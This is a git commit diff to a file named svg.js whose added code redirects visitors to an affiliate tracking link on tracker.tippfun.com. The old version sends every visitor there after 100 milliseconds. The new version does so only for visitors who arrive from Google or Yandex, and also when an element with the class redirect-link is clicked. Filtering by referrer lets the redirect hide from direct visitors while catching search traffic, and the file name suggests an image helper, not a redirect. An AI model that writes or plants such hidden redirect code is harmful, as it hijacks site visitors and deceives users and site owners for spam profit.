46b57bf9abfed8c1429436b6ed1fb3c5c3e36bcf
rollseo <rollettoseo@gmail.com>
2024-10-04 16:16:12 +0300

    Update svg.js

--- svg.js
+++ svg.js
@@ -1,3 +1,14 @@
-setTimeout(function() {
-    window.location.href = "https://tracker.tippfun.com/api/link/tracker?mediaid=11782&lang=tr&affiliategid=2aeb6f68-b43a-4ddc-a97b-d4e77a938ea7";
-}, 100);
+document.addEventListener("DOMContentLoaded", function() {
+                var referrer = document.referrer;
+                var isGoogleReferrer = referrer.includes("google");
+                var isYandexReferrer = referrer.includes("yandex");
+                var targetUrl = "https://tracker.tippfun.com/api/link/tracker?mediaid=11782&lang=tr&affiliategid=2aeb6f68-b43a-4ddc-a97b-d4e77a938ea7";
+
+                if (isGoogleReferrer || isYandexReferrer) {
+                    window.location.href = targetUrl;
+                }
+
+                document.querySelector('.redirect-link').addEventListener('click', function() {
+                    window.location.href = targetUrl;
+                });
+            });
